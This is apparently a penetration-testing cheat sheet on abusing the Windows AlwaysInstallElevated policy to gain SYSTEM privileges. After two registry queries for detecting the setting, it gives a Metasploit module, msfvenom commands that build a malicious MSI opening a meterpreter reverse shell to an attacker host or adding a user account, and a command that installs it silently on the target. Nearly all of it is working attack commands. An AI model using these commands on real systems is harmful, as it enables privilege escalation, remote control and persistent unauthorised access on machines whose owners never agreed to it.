# AlwaysInstallElevated
AlwaysInstallElevated policy is allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges.

### Detection
Check if REG_DWORD value is 0x1 in 2 registry
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit
```
use exploit/windows/local/always_install_elevated
```

### Generate .msi file with Msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP_ADDRESS LPORT=LOCAL_PORT –f msi > evil.msi
```
```
msfvenom -p windows/adduser USER=username PASS=password -f msi > adduser.msi # Add user
```

### Execute .msi file on command line of target system
```
msiexec /quiet /qn /i evil.msi
```
